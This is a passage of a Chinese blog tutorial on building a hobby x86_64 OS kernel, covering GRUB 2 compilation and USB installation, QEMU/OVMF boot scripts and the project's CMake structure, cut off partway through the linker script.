分区表：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214927.png"></p><blockquote><p>此时可能会提示无法重建分区表，这是因为操作系统可能偷偷帮你把分区挂载在 <code>/run/你的用户名</code> ，请使用 <code>umount</code> 卸载所有活动分区，之后重新启动 <code>GParted</code></p></blockquote><p>然后右键新建分区，这里笔者选择建立一个大小为 512MB 的 EFI 分区，注意<strong>该分区必须为 fat32 格式</strong>，剩余的空间作为一个文件系统分区， <em>我们将在后续开发文件系统时用到它</em> ，划分好后点绿色的✅然后 <code>Apply</code>：</p><blockquote><p>这里 GParted 会在 U 盘末尾留下 1MB 的空间，用来放 MBR 分区表，主要是出于兼容目的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127160626.png"></p><p>接下来我们从源码编译 GRUB，首先从 <a href="https://ftp.gnu.org/gnu/grub/">GNU GRUB 的 FTP 服务器</a>进行下载源码，然后在单独的文件夹中进行编译，这里我们三种 GRUB 都编译上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">也可以从这里获取： git <span class="hljs-built_in">clone</span> git://git.savannah.gnu.org/grub.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> grub-2.06/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> EFI32 EFI64 BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> EFI64</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=x86_64 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI32</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=pc --disable-nls &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>注：如果你使用的是 Arch&#x2F;Fedora&#x2F;openSUSE 这样更新比较快的系统，在编译的时候可能会出错（<del>GCC 背大锅</del>），那么这个时候可能就需要使用更新版本的源码，笔者物理机此前使用的是 Fedora Workstation 38，编译 2.06 时爆了莫名其妙的问题，所以后来笔者选择了 <a href="https://git.savannah.gnu.org/cgit/grub.git/tag/?h=grub-2.12-rc1">2.12 rc1</a> 版本的 GRUB2</p></blockquote><p>然后将 GRUB2 安装到 U 盘的 EFI 分区上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt <span class="hljs-comment"># 注意替换成自己的 U 盘对应的设备节点</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI64/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../EFI32/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=i386-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../BIOS/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --no-floppy --target=i386-pc --boot-directory=/mnt/boot /dev/sdb</span><br></code></pre></td></tr></table></figure><blockquote><p>这里直接用系统自带的 <code>grub-install</code> 也可以直接安装，但是笔者在 Fedora 系统上使用自带的 <code>grub2-install</code> 时出现了这样一个错误：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">grub2-install: <span class="hljs-keyword">error</span>: this utility cannot be used <span class="hljs-keyword">for</span> EFI platforms because <span class="hljs-keyword">it</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> support UEFI Secure Boot.<br></code></pre></td></tr></table></figure><p>网上也没有找到什么比较好的解决方案，笔者只好从源码进行编译</p><blockquote><p>但是 Ubuntu&#x2F;openSUSE 自带的 <code>grub-install/grub2-install</code> 就能正常使用，怎么回事呢</p></blockquote></blockquote><p>接下来我们新建一个文件 <code>/mnt/boot/grub/grub.cfg</code> （假设你的 U 盘 EFI 分区和笔者一样挂载在 <code>/mnt</code> 下），其为 GRUB 的配置文件，编写内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cfg">set timeout=10  # waiting time befo automatic booting<br>set default=0   # default menu entry index<br><br>insmod all_video<br><br>menuentry &quot;Boot ClosureOS v0.0.1&quot; &#123;<br>multiboot2 /boot/kernel.bin # use multiboot2 spec to boot<br>boot<br>&#125;<br><br>if [ $&#123;grub_platform&#125; == &quot;efi&quot; ]; then<br>menuentry &quot;UEFI Setting&quot; &#123;<br>fwsetup<br>&#125;<br>fi<br><br>menuentry &quot;System Reboot&quot; --class=reboot &#123;<br>reboot<br>&#125;<br><br>menuentry &quot;System Shutdown&quot; --class=halt &#123;<br>halt<br>&#125;<br></code></pre></td></tr></table></figure><p>卸载 U 盘，重新启动计算机，进入你的 BIOS&#x2F;UEFI 配置界面，关闭安全启动（<code>Secure Boot</code>），将 U 盘配置为第一个启动项（通常开头会有一个 <code>UEFI: </code> 的标识），重新启动计算机，接下来——</p><p><strong>GNU GRUB，启动！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040634.png"></p><p>当然，现在我们还没有开始编写操作系统内核，所以想要直接启动会报错，不过后面我们编写的内核直接放到 U 盘 EFI 分区的<code>boot/kernel.bin</code> 这个位置就可以直接启动了：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114235156.png"></p><h2 id="创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动"><a href="#创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动" class="headerlink" title="创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动"></a>创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动</h2><p>首先安装一些可能需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y qemu qemu-system-x86 ovmf xorriso</span><br></code></pre></td></tr></table></figure><p>然后使用如下脚本在 QEMU 中从 U 盘启动 GRUB，注意替换成你自己的 U 盘设备节点路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sudo qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=/dev/sdb,format=raw,index=0,media=disk<br>-s<br></code></pre></td></tr></table></figure><p>各参数说明如下：</p><ul><li><code>-bios</code> ：指定使用的启动固件，这里是 OVMF，源自于 <a href="https://github.com/tianocore/edk2">EDK2</a> 的 UEFI 固件</li><li><code>-cpu</code>：指定 CPU 类型及特性，<code>kvm64</code> 是一种常规的 CPU 类型，<code>+smep</code> 和 <code>+smap</code> 表示开启阻止内核空间执行&#x2F;访问用户空间数据的保护</li><li><code>-smp</code>：指定 CPU 插槽数、单个插槽上 DIE 的数量、每个 DIE 的核心数、每个核心的线程数</li><li><code>-m</code>：内存大小</li><li><code>--machine</code> ：机器设备类型，QEMU 支持两种设备，另外一种是比较老的 <code>i440fx</code></li><li><code>-drive</code>：添加一个设备，这里添加了 <code>/dev/sdc</code> 设备</li><li><code>-s</code>：支持通过使用 gdb 连接 <code>0.0.0.0:1234</code> 进行调试</li></ul><p>简单测试一下，成功进入 GRUB 界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040935.png"></p><blockquote><p>如果未指定 <code>-bios</code> 参数，则默认会使用 SeaBIOS 进行启动，此时便是传统的 BIOS + MBR 启动方式：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041009.png"></p></blockquote><p>不过可能也有同学手上暂时没有闲置的 U 盘或其他外部存储设备，此时我们也可以使用 <code>grub-mkrescue</code> 创建一个专门用来调试的镜像，首先创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree target/</span><br>target/<br>└── x86_64<br>    └── iso<br>        └── boot<br>            └── grub<br>                └── grub.cfg<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><p>接下来使用  <code>grub-mkrescue</code> 创建镜像：</p><blockquote><p>在部分发行版上，这可能叫 <code>grub2-mkrescue</code> ，固件路径也可能不一样，请自行分辨</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkrescue /usr/lib/grub/x86_64-efi -o kernel.iso target/x86_64/iso</span><br></code></pre></td></tr></table></figure><p>把启动脚本中的设备节点路径改成文件路径即可成功启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=./kernel.iso,format=raw,index=0,media=disk<br></code></pre></td></tr></table></figure><h1 id="0x03-启动一个空白内核"><a href="#0x03-启动一个空白内核" class="headerlink" title="0x03. 启动一个空白内核"></a>0x03. 启动一个空白内核</h1><p>接下来我们终于要正式开始进行内核的编写了，过去绝大部分的操作系统内核都是用 <code>汇编 + C 语言</code> 编写的，不过最近也有使用 Rust 替换 C 语言的内核实现（例如国产操作系统 <a href="https://dragonos.org/">DragonOS</a> ，<strong>与绝大多数 Linux 系统调用兼容，目前已经完成了 musl-gcc 的移植</strong>，笔者觉得非常🐂🍺），Rust 也在逐渐进入 Linux 内核，包括<a href="https://os.educg.net/#/">计算机系统能力大赛</a> 主推的也是 Rust 内核</p><p>但是对于新手而言 Rust 终归是有些难以让人绷得住，在笔者看来<strong>不能像 C 语言那样提供足够贴近于硬件底层的直接抽象</strong>，因此笔者这里还是先选择自己最喜欢的 C 语言编写内核最核心部分的代码，不过后面我们也可能引入一部分 C++ 代码 ：）</p><blockquote><p>算下来已经是笔者写的第四个内核了，希望这次能够达到比较高的一个完成度</p></blockquote><h2 id="代码基本结构"><a href="#代码基本结构" class="headerlink" title="代码基本结构"></a>代码基本结构</h2><p>最初的代码结构如下所示，包含一个空白内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── LICENSE<br>├── README.md<br>├── src<br>│   ├── arch<br>│   │   ├── CMakeLists.txt<br>│   │   └── x86<br>│   │       ├── boot<br>│   │       │   ├── boot_font.o<br>│   │       │   ├── boot_main.c<br>│   │       │   ├── boot.S<br>│   │       │   ├── boot_tty.c<br>│   │       │   └── CMakeLists.txt<br>│   │       ├── CMakeLists.txt<br>│   │       ├── include<br>│   │       │   └── asm<br>│   │       │       ├── com.h<br>│   │       │       ├── cpu_types.h<br>│   │       │       ├── io.h<br>│   │       │       └── page_types.h<br>│   │       └── linker.lds<br>│   ├── CMakeLists.txt<br>│   ├── include<br>│   │   ├── boot<br>│   │   │   └── multiboot2.h<br>│   │   ├── closureos<br>│   │   │   └── types.h<br>│   │   └── graphics<br>│   │       └── tty<br>│   │           ├── default.h<br>│   │           └── font<br>│   │               └── psf.h<br>│   └── kernel<br>│       ├── CMakeLists.txt<br>│       └── main.c<br>├── targets<br>│   └── x86_64<br>│       └── iso<br>│           └── boot<br>│               └── grub<br>│                   └── grub.cfg<br>└── tools<br>    └── scripts<br>        ├── boot.sh<br>        └── repack_iso.sh<br><br>21 directories, 24 files<br></code></pre></td></tr></table></figure><p>我们使用 <code>CMake</code> 来进行项目管理，相比起传统的 <code>Makefile</code> ，这是一种更加方便、更加自动化、更加规范的现代编译工具</p><blockquote><p>什么，你不知道如何编写 CMake？还不<a href="https://cmake.org/cmake/help/latest/index.html">赶快学！</a></p></blockquote><p>根目录的 <code>CMakeLists.txt</code> 编写如下，主要作用就是准备统一的编译参数、进入不同文件夹进行 make、链接所有的目标文件，这里我们去掉了标准库支持、去掉了调试段、指定了静态编译……因为在裸金属环境下能依赖的只有我们自己：）</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.16</span>)<br><span class="hljs-keyword">project</span>(ClosureOS)<br><br><span class="hljs-comment"># for debugging only</span><br><span class="hljs-comment">#set(CMAKE_VERBOSE_MAKEFILE ON)</span><br><br><span class="hljs-comment"># languages we will use</span><br><span class="hljs-keyword">enable_language</span>(C)<br><span class="hljs-keyword">enable_language</span>(ASM)<br><br><span class="hljs-comment"># check for current compiler environment, temporarily support linux only</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">NOT</span> CMAKE_HOST_SYSTEM_NAME <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;Linux&quot;</span>)<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Unsatisfied compilation environment, only support Linux now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># global link script</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -T $&#123;CMAKE_SOURCE_DIR&#125;/arch/x86/linker.lds&quot;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># compile and link as bare bone project</span><br><span class="hljs-keyword">add_compile_options</span>(-pipe -ffreestanding -nostdlib -fno-pie -fno-stack-protector -mcmodel=large -fno-asynchronous-unwind-tables)<br><span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -nostdlib -z max-page-size=0x1000 -Wl,--build-id=none -static&quot;</span>)<br><br><span class="hljs-comment"># general include dirs</span><br><span class="hljs-keyword">include_directories</span>(<span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/<span class="hljs-keyword">include</span>)<br><br><span class="hljs-comment"># seperate module</span><br><span class="hljs-keyword">add_subdirectory</span>(arch)<br><span class="hljs-keyword">add_subdirectory</span>(kernel)<br><br><span class="hljs-comment"># we create an empty file for add_executable(), as it must need at least one file to work</span><br><span class="hljs-keyword">file</span>(WRITE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span> <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">add_executable</span>(kernel.bin <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_BINARY_DIR&#125;/internal_empty_file_for_occupation_only.cpp&quot;</span>)<br><br><span class="hljs-comment"># final output</span><br><span class="hljs-keyword">target_link_libraries</span>(kernel.bin<br>    PRIVATE<br>        Arch<br>        Kernel<br>)<br><br></code></pre></td></tr></table></figure><p><code>include</code> 目录下是用于各个子系统的各种头文件，与 multiboot2 规范相关的一些定义放在 <code>include/boot/multiboot2.h</code> 中，该头文件来自于<a href="https://www.gnu.org/software/grub/manual/multiboot2/html_node/multiboot2_002eh.html">Multiboot 2 spec</a>，比较长，这里就不贴出来了</p><p>内核主体放在 <code>kernel</code> 目录下，其中 <code>kernel/CMakeLists.txt</code> 编写如下，目前暂时就只是添加当前文件夹下文件链接为 <code>Kernel</code> ：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Kernel)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>kernel/main.c</code> 暂时就先放一个空的函数， <em>本篇博客暂时还用不到这块</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>arch</code> 目录下是与架构相关的代码，目前暂时还是只支持 x86，不过后续如果有机会的话笔者希望能够让他在更多架构上跑起来，所以这里设计了一个通用的 <code>CMakeLists.txt</code>：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Arch)<br><br><span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br><br><span class="hljs-comment"># check for current architecture</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">add_subdirectory</span>(x86)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span><br>        INTERFACE<br>            X86)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/CMakeLists.txt</code> 主要就是编译汇编和 C 文件以及启动阶段临时用的字体文件放到 <code>out/arch</code> 目录下，这里我们将启动阶段所需的代码都放在 <code>arch/x86/boot</code> 目录下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME X86)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">include_directories</span>(<span class="hljs-keyword">include</span>)<br><br><span class="hljs-keyword">add_subdirectory</span>(boot)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.cpp&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">target_sources</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> PUBLIC Boot)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE)<br>    <span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> INTERFACE Boot)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><p><code>arch/x86/boot/CMakeLists.txt</code> 则就只是简单地编译当前目录的代码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">set</span>(TARGET_NAME Boot)<br><span class="hljs-keyword">set</span>(SOURCE_FILE)<br><br><span class="hljs-keyword">file</span>(GLOB SOURCE_FILE <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.S&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/*.c&quot;</span><br>                      <span class="hljs-string">&quot;$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/boot_font.o&quot;</span>)<br><br><span class="hljs-keyword">if</span>(SOURCE_FILE)<br>    <span class="hljs-keyword">add_library</span>(<span class="hljs-variable">$&#123;TARGET_NAME&#125;</span> <span class="hljs-variable">$&#123;SOURCE_FILE&#125;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;no source files provided for boot&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br></code></pre></td></tr></table></figure><h2 id="linker-lds：链接脚本"><a href="#linker-lds：链接脚本" class="headerlink" title="linker.lds：链接脚本"></a>linker.lds：链接脚本</h2><blockquote><p>什么，你不知道什么事链接脚本？还不<a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html">赶快学</a>！</p></blockquote><p>链接脚本用来指示我们的内核可执行文件各个段的布局，例如不同的段的加载地址，在操作系统开发中有个不成文的约定就是将内核加载到物理内存 1M 起始，因此我们需要在链接脚本中将我们的引导部分放到这个位置，同时作为一个不成文的规范，<strong>内核应当被装载到高地址处</strong>，那么我们的内核应当分为如下两大部分：</p><ul><li>boot：由 GRUB 引导，负责进行页表重映射、内存管理初始化等预备工作，完成后跳转至内核</li><li>kernel：实际的内核主体，位于虚拟地址的高地址处</li></ul><p>笔者选择将 boot 阶段的所有代码全都放在开头为 <code>.boot</code> 的段当中，将 kernel 的 <code>.text</code> 等段重新从高地址处计算起始地址，因此链接脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 